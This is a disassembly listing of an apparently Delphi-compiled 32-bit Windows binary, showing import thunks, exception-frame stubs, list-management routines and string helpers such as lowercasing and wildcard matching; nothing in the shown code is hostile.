; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34F8        proc near               ; CODE XREF: sub_5494+49↓p
                jmp     dword ptr ds:415220h
sub_34F8        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3500        proc near               ; CODE XREF: sub_53D8+20↓p
                                        ; sub_567C+7A↓p
                jmp     dword ptr ds:41521Ch
sub_3500        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3508        proc near               ; CODE XREF: sub_38B8+2↓p
                                        ; sub_567C+5B↓p
                jmp     dword ptr ds:415218h
sub_3508        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3510        proc near               ; CODE XREF: sub_5554+3E↓p
                                        ; sub_567C+193↓p
                jmp     dword ptr ds:415214h
sub_3510        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3518        proc near               ; CODE XREF: sub_567C+A4↓p
                jmp     dword ptr ds:415210h
sub_3518        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3520        proc near               ; CODE XREF: sub_38E0+C↓p
                                        ; sub_567C:loc_5865↓p
                jmp     dword ptr ds:41520Ch
sub_3520        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3528        proc near               ; CODE XREF: sub_5424+E↓p
                                        ; sub_567C+B7↓p ...
                jmp     dword ptr ds:415208h
sub_3528        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3530        proc near               ; CODE XREF: sub_567C+168↓p
                jmp     dword ptr ds:415204h
sub_3530        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3538        proc near               ; CODE XREF: sub_5494+22↓p
                                        ; sub_55E0+12↓p ...
                jmp     dword ptr ds:415200h
sub_3538        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3540        proc near               ; CODE XREF: sub_38B8+1B↓p
                                        ; sub_38E0+7↓p ...
                jmp     dword ptr ds:4151FCh
sub_3540        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3548        proc near               ; CODE XREF: sub_567C+DF↓p
                jmp     dword ptr ds:4151F8h
sub_3548        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3550        proc near               ; CODE XREF: sub_5494+8C↓p
                jmp     dword ptr ds:4151F4h
sub_3550        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3558        proc near               ; CODE XREF: sub_3C08+2A↓p
                jmp     dword ptr ds:415244h
sub_3558        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3560        proc near               ; CODE XREF: sub_5A38+11A↓p
                                        ; sub_5A38+33F↓p ...
                jmp     dword ptr ds:415240h
sub_3560        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3568        proc near               ; CODE XREF: sub_58E4+F↓p
                jmp     dword ptr ds:41523Ch
sub_3568        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3570        proc near               ; CODE XREF: sub_567C+B2↓p
                jmp     dword ptr ds:415238h
sub_3570        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3578        proc near               ; CODE XREF: sub_53D8+19↓p
                                        ; sub_5554+23↓p ...
                jmp     dword ptr ds:415234h
sub_3578        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3580        proc near               ; CODE XREF: sub_5920+20↓p
                                        ; sub_5F48+B8↓p
                jmp     dword ptr ds:415230h
sub_3580        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3588        proc near               ; CODE XREF: sub_3A9C+A↓p
                jmp     dword ptr ds:41522Ch
sub_3588        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3590        proc near               ; CODE XREF: sub_53D8+2C↓p
                                        ; sub_5554+49↓p ...
                jmp     dword ptr ds:415228h
sub_3590        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3598        proc near               ; CODE XREF: sub_65D0+198↓p
                xor     ecx, ecx
                call    sub_1A60
                retn
sub_3598        endp

; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    4041C5h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A660h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    4041CCh

loc_35C4:                               ; CODE XREF: CODE:000035CA↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_35C4
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h
                sub     dword ptr ds:40A660h, 1
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    4041FDh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A664h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    404204h

loc_35FC:                               ; CODE XREF: CODE:00003602↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_35FC
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                sub     dword ptr ds:40A664h, 1
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    404235h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A668h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    40423Ch

loc_3634:                               ; CODE XREF: CODE:0000363A↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_3634
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h
                sub     dword ptr ds:40A668h, 1
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3648        proc near               ; CODE XREF: sub_60A8+1F↓p
                jmp     dword ptr ds:415250h
sub_3648        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3650        proc near               ; CODE XREF: CODE:00006D69↓p
                jmp     dword ptr ds:41524Ch
sub_3650        endp

; ---------------------------------------------------------------------------
                align 4
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    40427Dh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A66Ch
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    404284h

loc_367C:                               ; CODE XREF: CODE:00003682↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_367C
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                sub     dword ptr ds:40A66Ch, 1
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    4042B5h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A670h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    4042BCh

loc_36B4:                               ; CODE XREF: CODE:000036BA↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_36B4
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h
                sub     dword ptr ds:40A670h, 1
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    4042EDh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A674h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    4042F4h

loc_36EC:                               ; CODE XREF: CODE:000036F2↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_36EC
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                sub     dword ptr ds:40A674h, 1
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    404325h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A678h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    40432Ch

loc_3724:                               ; CODE XREF: CODE:0000372A↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_3724
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h
                sub     dword ptr ds:40A678h, 1
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    40435Dh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A67Ch
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    404364h

loc_375C:                               ; CODE XREF: CODE:00003762↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_375C
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                sub     dword ptr ds:40A67Ch, 1
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    404395h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A680h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    40439Ch

loc_3794:                               ; CODE XREF: CODE:0000379A↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_3794
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h
                sub     dword ptr ds:40A680h, 1
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    4043CDh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A684h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    4043D4h

loc_37CC:                               ; CODE XREF: CODE:000037D2↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_37CC
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                sub     dword ptr ds:40A684h, 1
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    404405h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A688h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    40440Ch

loc_3804:                               ; CODE XREF: CODE:0000380A↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_3804
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h
                sub     dword ptr ds:40A688h, 1
                retn
; ---------------------------------------------------------------------------
                dd 404424h, 28h, 0
                dd 4044F4h, 40457Ch, 404438h, 5Ch, 0
                dd 4044F4h, 405994h, 40444Ch, 2Ah, 0
                dd 405CA0h, 405C90h, 404460h, 73h, 0
                dd 4044F4h, 406084h, 404474h, 21h, 0
                dd 4044F4h, 406500h, 404488h, 2Ch, 0
                dd 4044F4h, 4052E8h

; =============== S U B R O U T I N E =======================================


sub_3890        proc near               ; CODE XREF: sub_3B50↓p
                                        ; sub_3C94+5↓p ...
                test    eax, eax
                jnz     short locret_3899
                mov     eax, 4090E4h

locret_3899:                            ; CODE XREF: sub_3890+2↑j
                retn
sub_3890        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_389C        proc near               ; CODE XREF: sub_3B68+2↓p
                                        ; sub_5294:loc_529F↓p
                test    edx, edx
                jnz     short locret_38A5
                mov     edx, 4090E4h

locret_38A5:                            ; CODE XREF: sub_389C+2↑j
                retn
sub_389C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_38A8        proc near               ; CODE XREF: sub_3C94+34↓p
                                        ; sub_3C94+39↓p ...

arg_0           = dword ptr  4

                pop     eax
                xchg    eax, [esp-4+arg_0]
                push    eax
                mov     eax, esp
                call    sub_2494
                pop     eax
                retn
sub_38A8        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_38B8        proc near               ; CODE XREF: sub_5494+35↓p

var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0
                call    sub_3508
                pop     edx
                push    eax
                push    edx
                mov     eax, ebx
                call    dword ptr [ebx+34h]
                mov     eax, ebx
                call    sub_5554
                push    eax
                push    [esp+0Ch+var_4]
                call    sub_3540
                pop     edx
                push    eax
                push    edx
                mov     eax, [esp+14h+var_C]
                retn
sub_38B8        endp ; sp-analysis failed


; =============== S U B R O U T I N E =======================================


sub_38E0        proc near               ; CODE XREF: sub_5494+4E↓p
                pop     ecx
                pop     eax
                pop     edx
                push    ecx
                push    edx
                push    eax
                push    edx
                call    sub_3540
                call    sub_3520
                retn
sub_38E0        endp

; ---------------------------------------------------------------------------
                align 4
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_38F8        proc near               ; CODE XREF: sub_396C+8↓p
                                        ; sub_46AC+12↓p ...
                call    sub_1BA0
                jz      short locret_3905
                push    eax
                mov     edx, [eax]
                call    dword ptr [edx]
                pop     eax

locret_3905:                            ; CODE XREF: sub_38F8+5↑j
                retn
sub_38F8        endp

; ---------------------------------------------------------------------------
                align 4
; START OF FUNCTION CHUNK FOR sub_3920

loc_3908:                               ; CODE XREF: sub_3920+2↓j
                mov     edx, [eax+4]
                sar     edx, 1
                jz      short loc_3915
                jb      short locret_391C
                dec     dword ptr [eax+4]
                stc

loc_3915:                               ; CODE XREF: sub_3920-13↑j
                jb      short locret_391C
                mov     edx, [eax]
                call    dword ptr [edx+4]

locret_391C:                            ; CODE XREF: sub_3920-11↑j
                                        ; sub_3920:loc_3915↑j
                retn
; END OF FUNCTION CHUNK FOR sub_3920
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_3920        proc near               ; CODE XREF: sub_393C+29↓p
                                        ; sub_398C:loc_39AD↓p ...

; FUNCTION CHUNK AT 00003908 SIZE 00000015 BYTES

                test    eax, eax
                jnz     loc_3908
                retn
sub_3920        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_392C        proc near               ; CODE XREF: CODE:00003983↓p
                                        ; CODE:000046F9↓p ...
                push    eax
                call    sub_393C
                pop     eax
                xor     edx, edx
                call    sub_1868
                retn
sub_392C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_393C        proc near               ; CODE XREF: sub_392C+1↑p
                xor     ecx, ecx
                xchg    ecx, [eax+8]
                jecxz   short loc_394B
                push    eax
                xchg    eax, edx
                mov     eax, [edx+0Ch]
                call    ecx
                pop     eax

loc_394B:                               ; CODE XREF: sub_393C+5↑j
                xor     ecx, ecx
                xchg    ecx, [eax+10h]
                jecxz   short locret_396B
                push    esi
                push    ecx
                mov     esi, [ecx+18h]
                mov     ecx, [ecx+1Ch]

loc_395A:                               ; CODE XREF: sub_393C+26↓j
                lodsd
                xchg    eax, edx
                lodsd
                push    ecx
                call    edx
                pop     ecx
                dec     ecx
                loop    loc_395A
                pop     eax
                call    sub_3920
                pop     esi

locret_396B:                            ; CODE XREF: sub_393C+14↑j
                retn
sub_393C        endp


; =============== S U B R O U T I N E =======================================


sub_396C        proc near               ; CODE XREF: sub_4A34+D↓p
                                        ; sub_51C4+B↓p ...
                mov     edx, ds:404418h
                xor     eax, eax
                call    sub_38F8
                retn
sub_396C        endp

; ---------------------------------------------------------------------------
                align 4
                push    eax
                call    sub_39D0
                pop     eax
                call    sub_392C
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_398C        proc near               ; CODE XREF: sub_46D8+8↓p
                test    eax, eax
                jz      short loc_39AD
                mov     ecx, [eax+1Ch]
                jecxz   short loc_39AD
                mov     edx, [eax+18h]
                push    eax

loc_3999:                               ; CODE XREF: sub_398C:loc_39AA↓j
                mov     eax, [edx+ecx*4-4]
                test    eax, eax
                jz      short loc_39AA
                push    edx
                push    ecx
                call    sub_1868
                pop     ecx
                pop     edx

loc_39AA:                               ; CODE XREF: sub_398C+13↑j
                loop    loc_3999
                pop     eax

loc_39AD:                               ; CODE XREF: sub_398C+2↑j
                                        ; sub_398C+7↑j
                call    sub_3920
                retn
sub_398C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_39B4        proc near               ; CODE XREF: sub_39E8+1E↓p
                                        ; sub_5294+A8↓p
                cmp     edx, [eax+1Ch]
                jge     short loc_39BC
                mov     edx, [eax+1Ch]

loc_39BC:                               ; CODE XREF: sub_39B4+3↑j
                cmp     edx, [eax+20h]
                jz      short locret_39CF
                mov     [eax+20h], edx
                shl     edx, 2
                lea     eax, [eax+18h]
                call    sub_1888

locret_39CF:                            ; CODE XREF: sub_39B4+B↑j
                retn
sub_39B4        endp


; =============== S U B R O U T I N E =======================================


sub_39D0        proc near               ; CODE XREF: CODE:0000397D↑p
                push    dword ptr [eax+18h]
                xor     edx, edx
                mov     [eax+18h], edx
                mov     [eax+1Ch], edx
                mov     [eax+20h], edx
                pop     eax
                call    sub_1868
                retn
sub_39D0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_39E8        proc near               ; CODE XREF: sub_3A70+6↓p
                                        ; sub_4A34+F3↓p ...
                push    edx
                lea     ecx, [eax+1Ch]
                mov     edx, [ecx]
                inc     dword ptr [ecx]
                push    edx
                cmp     edx, [eax+20h]
                push    eax
                jl      short loc_3A0B
                mov     ecx, [eax+24h]
                test    ecx, ecx
                jnz     short loc_3A04
                mov     ecx, edx
                shr     ecx, 2
                inc     ecx

loc_3A04:                               ; CODE XREF: sub_39E8+14↑j
                add     edx, ecx
                call    sub_39B4

loc_3A0B:                               ; CODE XREF: sub_39E8+D↑j
                pop     ecx
                pop     eax
                pop     edx
                mov     ecx, [ecx+18h]
                mov     [ecx+eax*4], edx
                retn
sub_39E8        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3A18        proc near               ; CODE XREF: sub_50EC+D↓p
                mov     ecx, 1
                call    sub_3A24
                retn
sub_3A18        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3A24        proc near               ; CODE XREF: sub_3A18+5↑p
                test    ecx, ecx
                jle     short locret_3A5B
                cmp     edx, [eax+1Ch]
                jge     short locret_3A5B
                push    ebx
                xchg    eax, ebx
                lea     eax, [ecx+edx]
                cmp     eax, [ebx+1Ch]
                jbe     short loc_3A3C
                mov     ecx, [ebx+1Ch]
                sub     ecx, edx

loc_3A3C:                               ; CODE XREF: sub_3A24+11↑j
                mov     eax, [ebx+18h]
                push    dword ptr [ebx+1Ch]
                sub     [ebx+1Ch], ecx
                mov     ebx, edx
                lea     edx, [eax+edx*4]
                lea     eax, [edx+ecx*4]
                add     ebx, ecx
                pop     ecx
                sub     ecx, ebx
                shl     ecx, 2
                call    sub_194C
                pop     ebx

locret_3A5B:                            ; CODE XREF: sub_3A24+2↑j
                                        ; sub_3A24+7↑j
                retn
sub_3A24        endp


; =============== S U B R O U T I N E =======================================


sub_3A5C        proc near               ; CODE XREF: sub_5118+8↓p
                                        ; sub_5184+18↓p ...
                xor     ecx, ecx
                test    edx, edx
                jl      short loc_3A6D
                cmp     edx, [eax+1Ch]
                jge     short loc_3A6D
                mov     eax, [eax+18h]
                mov     ecx, [eax+edx*4]

loc_3A6D:                               ; CODE XREF: sub_3A5C+4↑j
                                        ; sub_3A5C+9↑j
                mov     eax, ecx
                retn
sub_3A5C        endp


; =============== S U B R O U T I N E =======================================


sub_3A70        proc near               ; CODE XREF: sub_51C4+36↓p
                push    ecx
                push    eax
                push    dword ptr [eax+1Ch]
                push    edx
                call    sub_39E8
                pop     edx
                pop     eax
                sub     eax, edx
                shl     eax, 2
                mov     ecx, eax
                pop     eax
                mov     eax, [eax+18h]
                lea     eax, [eax+edx*4]
                jl      short loc_3A97
                push    eax
                lea     edx, [eax+4]
                call    sub_194C
                pop     eax

loc_3A97:                               ; CODE XREF: sub_3A70+1B↑j
                pop     ecx
                mov     [eax], ecx
                retn
sub_3A70        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3A9C        proc near               ; CODE XREF: sub_567C+9E↓p
                test    eax, eax
                jge     short locret_3AAB
                and     eax, 0FFh
                push    eax
                call    sub_3588

locret_3AAB:                            ; CODE XREF: sub_3A9C+2↑j
                retn
sub_3A9C        endp

; ---------------------------------------------------------------------------
                dd 0FFFFFFFFh, 8, 4C585649h, 544D4443h, 0

; =============== S U B R O U T I N E =======================================


sub_3AC0        proc near               ; CODE XREF: sub_3B50+6↓p
                push    edi
                push    eax
                mov     edi, eax
                or      ecx, 0FFFFFFFFh
                xor     al, al
                repne scasb
                not     ecx
                pop     edi
                xchg    eax, edx
                repne scasb
                xchg    eax, edi
                pop     edi
                jz      short loc_3AD8
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------

loc_3AD8:                               ; CODE XREF: sub_3AC0+13↑j
                dec     eax
                retn
sub_3AC0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3ADC        proc near               ; CODE XREF: sub_3D50+1A↓p
                push    edi
                mov     edi, eax
                mov     ecx, 0FFFFFFFFh
                xor     al, al
                repne scasb
                not     ecx
                std
                dec     edi
                mov     al, dl
                repne scasb
                mov     eax, 0
                jnz     short loc_3AFA
                mov     eax, edi
                inc     eax

loc_3AFA:                               ; CODE XREF: sub_3ADC+19↑j
                cld
                pop     edi
                retn
sub_3ADC        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_3B00        proc near               ; CODE XREF: sub_63E4+40↓p
                push    esi
                xchg    eax, edx
                push    eax
                call    sub_24E8
                pop     eax
                call    sub_285C
                push    eax
                call    sub_260C
                pop     esi
                xchg    eax, ecx
                jecxz   short loc_3B25

loc_3B18:                               ; CODE XREF: sub_3B00:loc_3B23↓j
                lodsb
                sub     al, 41h ; 'A'
                cmp     al, 1Ah
                jnb     short loc_3B23
                add     byte ptr [esi-1], 20h ; ' '

loc_3B23:                               ; CODE XREF: sub_3B00+1D↑j
                loop    loc_3B18

loc_3B25:                               ; CODE XREF: sub_3B00+16↑j
                pop     esi
                retn
sub_3B00        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3B28        proc near               ; CODE XREF: sub_3B98+2F↓p
                                        ; sub_4480+8A↓p
                push    ecx
                push    eax
                push    edx
                call    sub_260C
                pop     edx
                test    edx, edx
                jg      short loc_3B38
                xor     edx, edx
                inc     edx

loc_3B38:                               ; CODE XREF: sub_3B28+B↑j
                sub     eax, edx
                mov     ecx, eax
                pop     eax
                jge     short loc_3B46
                pop     eax
                jl      sub_2494

loc_3B46:                               ; CODE XREF: sub_3B28+15↑j
                inc     ecx
                call    sub_2864
                retn
sub_3B28        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_3B50        proc near               ; CODE XREF: sub_3B68+15↓p
                call    sub_3890
                push    eax
                call    sub_3AC0
                pop     edx
                test    eax, eax
                jz      short loc_3B64
                sub     eax, edx
                inc     eax
                retn
; ---------------------------------------------------------------------------

loc_3B64:                               ; CODE XREF: sub_3B50+E↑j
                dec     eax
                retn
sub_3B50        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3B68        proc near               ; CODE XREF: sub_3B98+7↓p
                push    esi
                push    eax
                call    sub_389C
                mov     esi, edx
                xor     ecx, ecx
                dec     ecx

loc_3B74:                               ; CODE XREF: sub_3B68+1D↓j
                                        ; sub_3B68+25↓j ...
                lodsb
                test    al, al
                jz      short loc_3B8F
                xchg    eax, edx
                pop     eax
                push    eax
                push    ecx
                call    sub_3B50
                pop     ecx
                test    eax, eax
                jle     short loc_3B74
                test    ecx, ecx
                jle     short loc_3B8F
                cmp     eax, ecx
                jge     short loc_3B74

loc_3B8F:                               ; CODE XREF: sub_3B68+F↑j
                                        ; sub_3B68+21↑j
                xchg    eax, ecx
                jl      short loc_3B74
                pop     ecx
                pop     esi
                retn
sub_3B68        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3B98        proc near               ; CODE XREF: sub_4600+4D↓p
                push    ebx
                push    edi
                mov     ebx, eax
                push    ecx
                mov     eax, [ebx]
                call    sub_3B68
                inc     eax
                jnz     short loc_3BB0
                mov     eax, [ebx]
                call    sub_260C
                inc     eax
                inc     eax

loc_3BB0:                               ; CODE XREF: sub_3B98+D↑j
                dec     eax
                mov     edi, eax
                mov     ecx, eax
                dec     ecx
                xor     edx, edx
                inc     edx
                mov     eax, [ebx]
                call    sub_2864
                mov     eax, [ebx]
                mov     edx, edi
                inc     edx
                mov     ecx, ebx
                call    sub_3B28
                pop     edi
                pop     ebx
                retn
sub_3B98        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_3BD0        proc near               ; CODE XREF: sub_6530+72↓p
                push    esi
                push    edi
                mov     esi, eax
                mov     edi, edx
                mov     edx, ecx
                xor     eax, eax
                and     edx, 3
                shr     ecx, 1
                shr     ecx, 1
                repe cmpsd
                jnz     short loc_3BEC
                mov     ecx, edx
                repe cmpsb
                jnz     short loc_3BEC
                inc     eax

loc_3BEC:                               ; CODE XREF: sub_3BD0+13↑j
                                        ; sub_3BD0+19↑j
                pop     edi
                pop     esi
                retn
sub_3BD0        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_3BF0        proc near               ; CODE XREF: sub_5370+9↓p
                test    eax, eax
                jz      short locret_3C04
                push    eax
                call    sub_1848
                pop     edx
                push    eax
                mov     cl, 0
                call    sub_1A60
                pop     eax

locret_3C04:                            ; CODE XREF: sub_3BF0+2↑j
                retn
sub_3BF0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3C08        proc near               ; CODE XREF: sub_3C94+11↓p
                                        ; sub_3C94+25↓p
                push    ebx
                push    esi
                push    edi
                mov     edi, edx
                mov     esi, eax
                mov     eax, esi
                call    sub_260C
                mov     ebx, eax
                mov     eax, esi
                call    sub_280C
                mov     edx, eax
                mov     eax, edi
                mov     ecx, ebx
                call    sub_2584
                test    ebx, ebx
                jle     short loc_3C37
                push    ebx
                mov     eax, [edi]
                push    eax
                call    sub_3558

loc_3C37:                               ; CODE XREF: sub_3C08+24↑j
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_3C08        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3C3C        proc near               ; CODE XREF: sub_3C94+2E↓p
                test    eax, eax
                jz      short locret_3C93
                xchg    eax, ecx
                xor     eax, eax
                mov     al, 2Ah ; '*'
sub_3C3C        endp


; =============== S U B R O U T I N E =======================================


sub_3C45        proc near               ; CODE XREF: sub_3C45+36↓p
                push    ecx
                push    edx

loc_3C47:                               ; CODE XREF: sub_3C45+2B↓j
                mov     ah, [edx]
                or      ah, [ecx]
                jz      short loc_3C91
                mov     ah, 0
                cmp     [edx], ax
                jz      short loc_3C91
                cmp     [ecx], ah
                jnz     short loc_3C65
                dec     edx

loc_3C59:                               ; CODE XREF: sub_3C45+17↓j
                inc     edx
                cmp     [edx], al
                jz      short loc_3C59
                cmp     [edx], ah
                setz    al
                jmp     short loc_3C91
; ---------------------------------------------------------------------------

loc_3C65:                               ; CODE XREF: sub_3C45+11↑j
                cmp     [edx], ah
                jz      short loc_3C8F
                cmp     byte ptr [edx], 3Fh ; '?'
                jnz     short loc_3C72

loc_3C6E:                               ; CODE XREF: sub_3C45+48↓j
                inc     ecx
                inc     edx
                jmp     short loc_3C47
; ---------------------------------------------------------------------------

loc_3C72:                               ; CODE XREF: sub_3C45+27↑j
                cmp     [edx], al
